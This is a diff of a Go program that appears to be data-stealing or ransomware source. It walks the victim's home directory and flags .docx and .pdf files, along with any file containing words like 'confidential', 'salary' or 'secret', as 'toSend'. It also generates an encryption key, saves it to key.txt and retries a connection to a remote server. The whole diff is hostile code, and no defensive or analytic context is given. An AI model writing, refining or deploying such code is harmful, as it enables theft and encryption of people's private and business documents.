@@ -28,7 +28,7 @@ import (
 
 var (
 	ToKeep []string = []string{ ".*\\.docx" , ".*\\.pdf" }
-        SensitiveContent [][]byte =[][]byte{ []byte("confidential"), []byte("money"), []byte("salary"), []byte("address"), []byte("secret"), []byte("ID"), []byte("employee") }
+	SensitiveContent [][]byte =[][]byte{ []byte("confidential"), []byte("money"), []byte("salary"), []byte("address"), []byte("secret"), []byte("ID"), []byte("employee") }
 
 )
 
@@ -82,40 +82,36 @@ func visit(files *[]keeper) filepath.WalkFunc {
             return nil
         }
 
-	k.filename = path
-        for _, value := range ToKeep {
-            if b, _ := regexp.Match(value, []byte(filepath.Base(path))); b {
-                k.toSend = true
-                break
-            } else {
-                k.toSend = false
-            }
-        }
+		k.filename = path
+		for _, value := range ToKeep {
+			if b, _ := regexp.Match(value, []byte(filepath.Base(path))); b {
+				k.toSend = true
+				break
+			} else {
+				k.toSend = false
+			}
+		}
 
-	f, err := os.OpenFile(path, os.O_RDONLY, 0755)
-	if err != nil {
-		k.toSend = false
+		content, err := ioutil.ReadFile(path)
+		if err != nil {
+			k.toSend = false
+			*files = append(*files, k)
+			return nil
+		}
+
+
+		for _, b := range SensitiveContent {
+			if bytes.Contains(content, b) {
+				k.toSend = true
+				break
+			} else {
+				k.toSend = false
+			}
+		}
+
 		*files = append(*files, k)
 		return nil
-	}
-
-	defer f.Close()
-
-	buf := bytes.NewBuffer(nil)
-	io.Copy(buf, f)
-
-	for _, b := range SensitiveContent {
-		if bytes.Contains(buf.Bytes(), b) {
-			k.toSend = true
-			break
-		} else {
-			k.toSend = false
 		}
-	}
-
-        *files = append(*files, k)
-        return nil
-    }
 }
 
 // NewEncryptionKey generates a random 256-bit key for Encrypt() and
@@ -194,6 +190,11 @@ func main() {
     var home string
 
     randomKey := NewEncryptionKey()
+	if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
+		dst := make([]byte, hex.EncodedLen(len(randomKey[:])))
+		hex.Encode(dst, randomKey[:])
+		ioutil.WriteFile("key.txt", randomKey[:], 0644)
+	}
 
     if runtime.GOOS == "windows" {
         home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
@@ -253,8 +254,8 @@ func main() {
         })
         if err != nil {
             if _, err := os.Stat("key.txt"); os.IsNotExist(err) {
-		    ioutil.WriteFile("key.txt", randomKey[:], 0644)
-		    randomKey = nil // clear key
+				ioutil.WriteFile("key.txt", randomKey[:], 0644)
+				randomKey = nil // clear key
             }
 
             fmt.Println("Connection failed. Retrying in 5 seconds..")
